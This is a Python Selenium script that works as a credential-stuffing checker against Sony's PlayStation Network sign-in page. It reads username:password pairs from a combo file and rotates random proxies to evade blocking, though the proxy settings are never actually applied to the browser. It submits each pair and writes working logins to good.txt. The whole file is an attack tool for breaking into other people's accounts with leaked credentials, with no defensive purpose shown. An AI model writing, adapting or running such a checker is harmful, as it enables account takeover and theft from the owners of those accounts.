from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from selenium import webdriver
from selenium.webdriver.common.proxy import Proxy, ProxyType
import random

f = open("servers.txt", "r")
file_data = f.read();
file_data = file_data.split('\n');



def checkPSN(usernamet, passwordt):


	prox = Proxy()
	prox.proxy_type = ProxyType.MANUAL
	prox.http_proxy = file_data[random.randint(0, len(file_data)-1)]
	prox.ssl_proxy = file_data[random.randint(0, len(file_data)-1)]

	capabilities = webdriver.DesiredCapabilities.CHROME
	prox.add_to_capabilities(capabilities)

	browser = webdriver.Chrome()
	browser.get('https://id.sonyentertainmentnetwork.com/signin/?ui=pr&response_type=token&scope=openid%3Auser_id%20openid%3Aonline_id%20openid%3Actry_code%20openid%3Alang%20user%3Aaccount.communication.get%20kamaji%3Aget_account_hash%20oauth%3Amanage_user_auth_sessions%20openid%3Aacct_uuid%20user%3Aaccount.authentication.mode.get%20user%3Aaccount.phone.masked.get%20user%3Aaccount.notification.create%20openid%3Acontent_ctrl%20user%3Aaccount.subaccounts.get%20openid%3Aage%20user%3Aaccount.graduate%20can%3Acontext.user.get%20can%3Acontext.user.set%20user%3AverifiedAccount.get%20kamaji%3Aaccount_link_user_link_account%20kamaji%3Aget_internal_entitlements%20ias%3Aaccount.onlineIdChange.get%20user%3Aaccount.onlineId.get%20user%3AonlineIdSuggestion.get%20kamaji%3Aactivity_feed_set_feed_privacy%20user%3Aaccount.identityMapper%20user%3Aaccount.email.create%20user%3Aaccount.emailVerification.get%20user%3Aaccount.personal.get%20user%3Aaccount.tosua.update%20device%3Aget%20device%3Aupdate%20device%3Aactivate%20openid%3Aacct_id_str%20deviceManagement%3Adevices.deactivateAll%20digitalRightsManagement%3ApremiumServices.update&redirect_uri=https%3A%2F%2Fid.sonyentertainmentnetwork.com%2Fid%2Fmanagement%2F%23%2Fp%3Fpr_referer%3Dcam%26entry%3D%252Fp&client_id=ce381e15-9cdd-4cf9-8384-0cf63db17f6a&state=16db0d6dbeaf1c0b6aa5f692c0cce040&entry=%2Fp&error=login_required&error_code=4165&error_description=User+is+not+authenticated&no_captcha=true#/signin?entry=%2Fsignin')
	#browser.get('https://api.ipify.org/')

	try:
		element = WebDriverWait(browser, 10).until(
			EC.presence_of_element_located((By.ID, "ember19"))
		)
		
		username = browser.find_element_by_id('ember19')
		username.send_keys(usernamet)
		
		password = browser.find_element_by_id('ember22')
		password.send_keys(passwordt)
		
		password = browser.find_element_by_xpath('/html/body/div[3]/div/div/div[3]/div/div/div/div/div[4]/div/div[1]/main/div/div[2]/div/form/div[3]/div/button').click();


		try:
			condition = WebDriverWait(browser, 5).until(
				EC.presence_of_element_located((By.XPATH, '//*[@id="ember30"]/div[2]/div'))
			)
			print('bad account')
		except:
			f = open("good.txt", "a")
			f.write(usernamet+':'+passwordt+"\n")
			f.close()
			print('good !')
			return('good account|| ' + usernamet + ':' + passwordt )

		
			pass
		finally:
			browser.close();
			pass
			
	except:
		pass


t = open("emails.txt", "r")
t = t.read();
t = t.split('\n');

for account in t:
	account_splitted = account.split(':');
	test = checkPSN(account_splitted[0], account_splitted[1])
	pass
	
